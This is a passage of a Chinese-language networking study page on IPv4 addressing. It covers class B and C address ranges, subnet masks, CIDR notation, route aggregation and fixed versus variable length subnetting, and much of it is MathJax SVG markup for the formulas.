93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1000,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1778,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2471.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3527.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1000,0)"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(1500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(2000,0)"></path></g></g></g></svg></mjx-container></li><li>每个网络中可分配的IP地址数量为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="15.489ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 6846.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1512.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2512.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(3290.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4346.1,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1000,0)"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(1500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(2000,0)"></path></g></g></g></svg></mjx-container>（减2的原因是除去主机号为全 0 的网络地址和全1的广播地址）</li></ul><img src="/posts/e255a10a/4.3.5.png" class="" title="B类地址"><h4 id="4-3-2-3-C类地址"><a href="#4-3-2-3-C类地址" class="headerlink" title="4.3.2.3 C类地址"></a>4.3.2.3 C类地址</h4><ul><li>最小网络号也是第一个可指派的网络号 192.0.0<br>网络地址为 192.0.0.0</li><li>最大网络号也是最后一一个可指派的网络号 223.255.255<br>网络地址为 223.255.255.0</li><li>可指派的网络数量为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="15.899ex" height="2.09ex" role="img" focusable="false" viewBox="0 -841.7 7027.3 923.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(1000,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(1778,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2471.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3527.3,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(1000,0)"></path><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z" transform="translate(1500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(2000,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(2500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(3000,0)"></path></g></g></g></svg></mjx-container></li><li>每个网络中可分配的IP地址数量为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="12.427ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 5492.6 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g><g data-mml-node="mo" transform="translate(1158.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2159,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(2936.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3992.6,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container>（减2的原因是除去主机号为全 0 的网络地址和全 1 的广播地址）</li></ul><img src="/posts/e255a10a/4.3.6.png" class="" title="C类地址"><h4 id="4-3-2-4-一般不使用的特殊IP地址"><a href="#4-3-2-4-一般不使用的特殊IP地址" class="headerlink" title="4.3.2.4 一般不使用的特殊IP地址"></a>4.3.2.4 一般不使用的特殊IP地址</h4><img src="/posts/e255a10a/4.3.7.png" class="" title="一般不使用的特殊IP地址"><h3 id="4-3-3-划分子网的IPv4地址"><a href="#4-3-3-划分子网的IPv4地址" class="headerlink" title="4.3.3 划分子网的IPv4地址"></a>4.3.3 划分子网的IPv4地址</h3><p>首先先明确为何要引出划分子网的概念：在 ARPANET 的早期，IP 地址的设计确实不够合理：</p><ol><li>IP 地址空间的利用率有时很低。</li><li>给每一个物理网络分配一个网络号会使路由表变得太大因而使网络性能变坏。</li><li>两级的 IP 地址不够灵活。</li></ol><p>例如：某一个大型局域网需要连接到因特网：</p><img src="/posts/e255a10a/4.3.8.png" class="" title="例子"><ul><li>此时由于C类地址不够存放所有主机，选择可分配主机数为65534个的B类地址，但是很明显此时会有很多主机地址没有被利用。</li><li>但是对于剩余的IP地址只能由该单位的同一个网络使用，其他网络不得使用。</li></ul><p>随着单位的发展，该单位需要将原来的网络划分成三个独立的网络。此时只能选择为子网申请新的网络号，但是申请新的网络号会带来以下弊端：</p><ul><li>需要等待时间和花费更多的费用</li><li>会增加其它路由器中路由表记录的数量</li><li>浪费原有网络中剩余的大量IP地址</li></ul><p>因此提出了一种解决办法：从多余的主机号中借用一部分作为子网号，而不用申请新的网络地址。</p><img src="/posts/e255a10a/4.3.9.png" class="" title="例子"><p>但是此时出现了一个新的问题：计算机要如何知道分类地址中有多少比特被用作子网号了呢？这就提出了一个子网掩码的概念。</p><p>32bit子网掩码可以表明分类IP地址的主机号部分被借用了几个比特作为子网号。</p><ul><li>子网掩码用连续的比特1来对应网络号和子网号。</li><li>子网掩码用连续的比特0来对应主机号。</li><li>将划分子网的<strong>IPv4地址</strong>与其<strong>相应的子网掩码进行逻辑与运算</strong>就可以得到IPv4地址<strong>所在的子网的网络地址</strong>。</li></ul><img src="/posts/e255a10a/4.3.10.png" class="" title="子网掩码计算"><img src="/posts/e255a10a/4.3.11.png" class="" title="习题一"><img src="/posts/e255a10a/4.3.12.png" class="" title="习题一"><img src="/posts/e255a10a/4.3.13.png" class="" title="默认子网掩码"><h3 id="4-3-4-无分类编址的IPv4地址"><a href="#4-3-4-无分类编址的IPv4地址" class="headerlink" title="4.3.4 无分类编址的IPv4地址"></a>4.3.4 无分类编址的IPv4地址</h3><p>划分子网在一定程度上缓解了因特网在发展中遇到的困难，但是数量巨大的C类网因为其地址（主机地址）空间太小没有得到充分使用，而因特网的IP地址仍在加速消耗，整个IPv4地址空间面临全部耗尽的威胁。</p><p>因此因特网工程任务组IETF又提出了无分址编址方式来解决地址紧张的问题。</p><p>1993年，IETF发布了无分类域间路由选择（Classless Inter-Domain Routing，CIDR），其主要的特点：</p><ul><li>CIDR消除了传统的A类、B类和C类地址，以及划分子网的概念。</li><li>CIDR可以更加有效分配IPv4的地址空间（使地址空间分配不再被主机号所限制，做到自由的根据主机规模分配），并且可以在新的IPv6使用之前允许因特网的规模继续增长。</li><li>CIDR使用各种长度的网络前缀(network-prefix)来代替分类地址中的网络号和子网号。</li></ul><p>CIDR使用斜线记法，或称之为CIDR记法。即在IPv4地址前面加上斜线“/”，在斜线后面写上网络前缀所占比特数量（就是分类地址中的网络号和子网号）。</p><img src="/posts/e255a10a/4.3.14.png" class="" title="举例"><p>CIDR实际上使将网络前缀都相同的连续IP地址组成一个“CIDR地址块”。我们只要知道CIDR地址块中的任何一个地址就可以知道该地址块的全部细节，例如：</p><ul><li>地址块的最小地址</li><li>地址块的最大地址</li><li>地址块中的地址数量</li><li>地址块聚合某类网络(A类、B类、C类)的数量</li><li>地址掩码(也可继续称为子网掩码)</li></ul><img src="/posts/e255a10a/4.3.15.png" class="" title="举例"><p>这里就出现了一个聚合的概念。其实聚合就是将多个小的网络连接起来，一起用一个大的网络分配给它们，向因特网只申请一个大的网络号，而不用申请多个小的网络号，因此形成了多个小网络聚合成一个大网络，减少了网络号的消耗。</p><img src="/posts/e255a10a/4.3.16.png" class="" title="路由聚合"><h3 id="4-3-5-IPv4地址的应用规划"><a href="#4-3-5-IPv4地址的应用规划" class="headerlink" title="4.3.5 IPv4地址的应用规划"></a>4.3.5 IPv4地址的应用规划</h3><p>IPv4地址的应用规划考虑的是给定一个IPv4地址块，如何将其划分成几个更小的地址块（来满足多子网划分），并将这些地址块分配给互联网中不同网络，进而可以给各网络中的主机和路由器接口分配IPv4地址。</p><p>IPv4的应用规划有两种：</p><ul><li><p>定长子网掩码（FLSM，Fixed Length Subnet Mask）</p><p>使用同一个子网掩码来划分子网</p><p>每个子网所分配的IP地址数量相同，造成IP地址浪费</p></li><li><p>变长子网掩码（VLSM，Variable Length Subnet Mask）</p><p>使用不同的子网掩码来划分子网</p><p>每个子网所分配的IP地址数量可以不同，尽可能减少对IP地址的浪费</p></li></ul><img src="/posts/e255a10a/4.3.17.png" class="" title="例子"><img src="/posts/e255a10a/4.3.18.png" class="" title="使用定长子网掩码划分子网"><img src="/posts/e255a10a/4.3.19.png" class="" title="使用定长子网掩码划分子网"><img src="/posts/e255a10a/4.3.20.png" class="" title="使用定长子网掩码划分子网"><img src="/posts/e255a10a/4.3.21.png" class="" title="使用变长子网掩码划分子网"><p>在地址块的分配原则中，每个子块的起点位置不能随意选取，只能选取块整数倍的地址作为起点，也就是比特位置上<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="2.279ex" height="1.528ex" role="img" focusable="false" viewBox="0 -675.5 1007.3 675.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(533,363) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 